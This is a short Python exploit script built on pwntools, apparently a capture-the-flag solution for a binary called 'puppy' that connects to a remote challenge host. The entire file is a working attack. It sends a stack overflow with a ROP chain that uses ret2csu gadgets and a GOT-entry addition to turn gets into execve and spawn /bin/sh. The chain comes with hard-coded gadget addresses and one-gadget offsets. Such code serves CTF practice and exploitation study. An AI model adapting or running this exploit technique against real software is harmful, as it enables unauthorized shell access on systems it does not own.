from pwn import *

sendlineafter = lambda p, x, y: p.sendlineafter(x, y)
sendline = lambda p, x: p.sendline(x)
send = lambda p, x: p.send(x)

filepath = './puppy'
e = context.binary = ELF(filepath, checksec=False)
context.terminal = 'bash'
if args.REMOTE:
    # p = remote('localhost', 7777)
    p = remote('mc.ax', 31819)
    libc = ELF('./libc.so.6')
    one_gadget = [0xebcf1, 0xebcf5, 0xebcf8]
else:
    p = process(filepath)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_gadget = [0xe3b2e, 0xe3b31, 0xe3b34]

def dbg(p):
    gdb.attach(p)
    pause()

# 0x0040111c: add dword [rbp-0x3D], ebx ; nop  ; ret  ;  (1 found)
# 0x004011ba: pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret  ;  (1 found)
# 0x004011a0: mov rdx, r14 ; mov rsi, r13 ; mov edi, r12d ; call qword [r15+rbx*8] ;  (1 found)
# 0x004011c3: pop rdi ; ret  ;  (1 found)
add_rbp_0x3d_ebx = 0x0040111c
csu_pop = 0x004011ba
csu_call = 0x004011a0
pop_rdi = 0x004011c3
offset = libc.symbols['execve'] - libc.symbols['gets']
got = 0x404018
writable = 0x404100

chain = [
    pop_rdi, writable,
    e.plt['gets'],

    csu_pop, 
    offset, got + 0x3d, 
    0, 0, 0, 0,
    add_rbp_0x3d_ebx,

    csu_pop,
    0, 0, 
    writable, 0,
    0, got,
    csu_call
]

payload = b'A' * 0x18
payload += b''.join([p64(i) for i in chain])

p.sendline(payload)
p.sendline(b'/bin/sh\0')
p.interactive()
